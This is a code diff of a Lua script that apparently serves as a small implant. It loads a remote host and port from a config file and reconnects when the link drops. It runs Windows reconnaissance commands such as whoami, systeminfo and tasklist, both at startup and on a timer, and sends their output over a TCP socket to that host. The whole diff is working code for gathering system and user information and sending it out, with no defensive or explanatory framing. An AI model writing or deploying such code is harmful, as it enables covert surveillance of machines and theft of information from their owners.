@@ -1,18 +1,25 @@
-ip = "192.168.5.224"
-port = 25
-trace = true 
---trace_out
---tcp_connect
---send_msg
---close_socket
+dofile("config.lua")
+trace = config.trace
 
---local s  = tcp_connect(ip,port)
+local flag,s  = tcp_connect(config.ip,config.port)
 
---
 --local cmds = {"tasklist","systeminfo","whoami","cmd.exe /C dir","cmd.exe /C echo %username%"}
 local cmds = {"whoami","cmd.exe /C dir","cmd.exe /C echo %username%"}
---local dirs = os.execute("dir")
---trace_out(dirs)
+
+local function is_alive()
+	return send_msg(s,"")
+end
+
+local function send_str(cmd,str)
+	local prefix = cmd .. "\r\n" .. str .. "\r\n"
+	prefix = string.len(prefix) .. "\r\n" .. prefix
+	if not is_alive() then
+		close_socket(s)
+		flag,s = tcp_connect(config.ip,config.port)
+	end
+	return send_msg(s,prefix)
+end
+
 function shell_exec(cmd)
 	local p_dir = pipe.new(cmd)	
 	local rs = {} 
@@ -30,12 +37,19 @@ function shell_exec(cmd)
 	p_dir:closein()
 	return rs
 end
+
+function exec_cmd(cmd)
+	local rs = shell_exec(cmd)
+	send_str(cmd,table.concat(rs))
+	--trace_out(table.concat(rs))
+end
+
+exec_cmd("whoami")
+exec_cmd("systeminfo")
+
 function on_time()
-	trace_out("on_time\n")
-	for i,v in ipairs(cmds) do
-		local rs = shell_exec(v)
-		trace_out(table.concat(rs))
-	end
+	exec_cmd("whoami")
+	exec_cmd("tasklist")
 end
 
 function on_quit()
